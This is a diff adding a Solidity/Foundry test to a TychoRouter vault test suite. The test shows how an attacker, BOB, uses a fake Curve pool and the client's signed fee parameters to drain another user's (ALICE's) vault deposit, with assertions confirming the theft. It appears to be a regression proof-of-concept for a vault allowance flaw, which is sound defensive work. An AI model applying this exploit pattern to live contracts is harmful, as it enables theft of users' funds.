@@ -346,6 +346,55 @@ contract TychoRouterUsingVaultTest is TychoRouterTestSetup {
         vm.stopPrank();
     }
 
+    function testAllowanceIssue() public {
+        uint256 stolenAmount = 1 ether;
+        // The client will contribute to this swap with their own funds
+        uint256 clientContribution = stolenAmount;
+        vm.startPrank(ALICE);
+        deal(WETH_ADDR, ALICE, clientContribution);
+        IERC20(WETH_ADDR).approve(address(tychoRouterAddr), stolenAmount);
+        tychoRouter.deposit(WETH_ADDR, clientContribution);
+
+        vm.stopPrank();
+        vm.startPrank(BOB);
+        deal(WETH_ADDR, BOB, stolenAmount);
+        IERC20(WETH_ADDR).approve(address(tychoRouterAddr), stolenAmount);
+        tychoRouter.deposit(WETH_ADDR, stolenAmount);
+
+        FakeCurvePool maliciousPool = new FakeCurvePool();
+
+        bytes memory protocolData = abi.encodePacked(
+            WETH_ADDR,
+            WETH_ADDR,
+            address(maliciousPool),
+            uint8(3),
+            uint8(1),
+            uint8(1)
+        );
+        bytes memory swap =
+            encodeSingleSwap(address(curveExecutor), protocolData);
+
+        ClientFeeParams memory feeParams =
+            makeClientFeeParams(0, stolenAmount, tychoRouterAddr, ALICE_PK);
+        tychoRouter.singleSwapUsingVault(
+            stolenAmount,
+            WETH_ADDR,
+            WETH_ADDR,
+            stolenAmount,
+            BOB,
+            feeParams,
+            swap
+        );
+
+        // ALICE (client) doesn't have funds anymore
+        assertEq(tychoRouter.balanceOf(ALICE, uint256(uint160(WETH_ADDR))), 0);
+        // Attacker BOB and maliciousPool have both stolenAmount
+        assertEq(IERC20(WETH_ADDR).balanceOf(BOB), stolenAmount); // from BOB's own vault
+        assertEq(
+            IERC20(WETH_ADDR).balanceOf(address(maliciousPool)), stolenAmount
+        ); // from the client contribution
+    }
+
     // ==================== Rebalance Vault tests ====================
     function testSingleSwapIntoVault() public {
         // Trade 1 WETH for DAI with 1 swap on Uniswap V2, with the receiver
